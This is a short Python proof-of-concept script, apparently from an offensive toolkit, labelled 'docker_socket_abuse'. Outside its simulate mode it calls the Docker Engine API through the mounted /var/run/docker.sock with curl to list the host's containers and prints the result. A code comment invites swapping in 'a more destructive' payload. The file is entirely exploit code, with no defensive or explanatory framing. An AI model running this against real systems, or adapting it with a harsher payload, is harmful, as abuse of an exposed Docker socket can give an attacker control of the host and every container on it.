import subprocess

def run(container_name, simulate=False):
    print("[+] Starting docker_socket_abuse PoC")
    print(f"[+] Target container: {container_name}")
    print(f"[+] Simulate mode: {simulate}")

    if simulate:
        print("[*] Simulating Docker socket abuse (no actual changes made).")
        print("[*] Would run: curl --unix-socket /var/run/docker.sock http://localhost/containers/json")
        return {"status": "simulated", "message": "Simulated Docker socket abuse."}

    # The actual payload - replace this with a more destructive one if needed
    curl_cmd = [
        "curl",
        "--unix-socket", "/var/run/docker.sock",
        "http://localhost/containers/json"
    ]

    print("[+] Executing real exploit payload via Docker socket...")
    print("[+] Running:", " ".join(curl_cmd))

    try:
        result = subprocess.run(curl_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
        stdout_output = result.stdout.decode()
        stderr_output = result.stderr.decode()

        print("[+] STDOUT:\n", stdout_output)
        if stderr_output:
            print("[!] STDERR:\n", stderr_output)

        return {
            "status": "executed",
            "stdout": stdout_output,
            "stderr": stderr_output
        }
    except Exception as e:
        print(f"[!] Exploit failed: {str(e)}")
        return {"status": "error", "error": str(e)}
